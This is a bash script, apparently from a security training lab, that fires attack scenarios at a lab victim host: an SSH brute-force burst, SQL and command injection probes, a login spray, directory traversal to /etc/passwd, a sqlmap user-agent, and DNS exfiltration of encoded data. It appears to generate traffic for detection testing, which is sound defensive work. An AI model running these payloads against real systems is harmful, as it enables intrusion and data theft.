#!/bin/bash
set -euo pipefail

SCENARIO="${1:-all}"
VICTIM_IP="${VICTIM_IP:-10.78.0.10}"
DNS_IP="${DNS_IP:-172.29.0.53}"
VICTIM_WEB_IP="${VICTIM_WEB_IP:-${VICTIM_IP}}"

usage() {
  cat <<'EOF'
Usage: /lab/advanced_scenarios.sh [scenario]

Scenarios:
  ssh-burst   Repeated SSH handshakes that look like a brute-force burst
  sqli        SQL injection probe requests against the victim web service
  cmdi        Command injection probe requests against the victim web service
  login-spray Repeated login requests against the victim web service
  traversal   Directory traversal probes against the victim web service
  recon-ua    A scan-like request using a sqlmap user-agent
  dns-exfil   Chunked data exfiltration over DNS queries
  all         Run every attacker-side advanced scenario above
EOF
}

run_ssh_burst() {
  echo "== SSH burst against ${VICTIM_IP} =="
  for attempt in $(seq 1 6); do
    echo "Attempt ${attempt}/6"
    ssh \
      -o StrictHostKeyChecking=no \
      -o UserKnownHostsFile=/dev/null \
      -o PreferredAuthentications=password \
      -o PubkeyAuthentication=no \
      -o NumberOfPasswordPrompts=0 \
      -o ConnectTimeout=3 \
      "root@${VICTIM_IP}" "exit" </dev/null || true
    sleep 1
  done
}

run_sqli() {
  local base_url="http://${VICTIM_WEB_IP}"
  echo "== SQL injection probes against ${base_url} =="
  curl -fsS "${base_url}/search.php?q=UNION-SELECT-username,password-FROM-users" -o /dev/null || true
  curl -fsS "${base_url}/login.php?username=admin%27+OR+%271%27%3D%271&password=demo" -o /dev/null || true
}

run_cmdi() {
  local base_url="http://${VICTIM_WEB_IP}"
  echo "== Command injection probes against ${base_url} =="
  curl -fsS "${base_url}/cgi-bin/status?cmd=id;cat+/etc/passwd" -o /dev/null || true
  curl -fsS "${base_url}/api/diag?exec=whoami;uname+-a" -o /dev/null || true
}

run_login_spray() {
  local base_url="http://${VICTIM_WEB_IP}"
  echo "== Web login spray against ${base_url} =="
  for attempt in $(seq 1 6); do
    curl -fsS "${base_url}/login.php?username=admin&password=guess${attempt}" -o /dev/null || true
    sleep 1
  done
}

run_traversal() {
  local base_url="http://${VICTIM_WEB_IP}"
  echo "== Directory traversal probes against ${base_url} =="
  curl -fsS "${base_url}/download?file=../../../../etc/passwd" -o /dev/null || true
  curl -fsS "${base_url}/../../../../etc/passwd" -o /dev/null || true
}

run_recon_ua() {
  local base_url="http://${VICTIM_WEB_IP}"
  echo "== Recon tool user-agent against ${base_url} =="
  curl -fsS -A "sqlmap/1.8.2#stable (https://sqlmap.org)" "${base_url}/inventory" -o /dev/null || true
}

run_dns_exfil() {
  local encoded idx=1
  echo "== DNS exfiltration burst via ${DNS_IP} =="
  encoded="$(printf '%s' 'student-project-demo|alice@example.local|lab-secret' | base64 | tr '[:upper:]' '[:lower:]' | tr -cd 'a-z0-9')"
  while IFS= read -r chunk; do
    [ -n "${chunk}" ] || continue
    dig @"${DNS_IP}" "${chunk}.chunk${idx}.exfil.lab" +short || true
    idx=$((idx + 1))
    sleep 1
  done < <(printf '%s' "${encoded}" | fold -w 12)
}

run_all() {
  run_ssh_burst
  run_sqli
  run_cmdi
  run_login_spray
  run_traversal
  run_recon_ua
  run_dns_exfil
}

case "${SCENARIO}" in
  ssh-burst)
    run_ssh_burst
    ;;
  sqli)
    run_sqli
    ;;
  cmdi)
    run_cmdi
    ;;
  login-spray)
    run_login_spray
    ;;
  traversal)
    run_traversal
    ;;
  recon-ua)
    run_recon_ua
    ;;
  dns-exfil)
    run_dns_exfil
    ;;
  all)
    run_all
    ;;
  -h|--help|help)
    usage
    ;;
  *)
    echo "Unknown scenario: ${SCENARIO}" >&2
    usage >&2
    exit 1
    ;;
esac
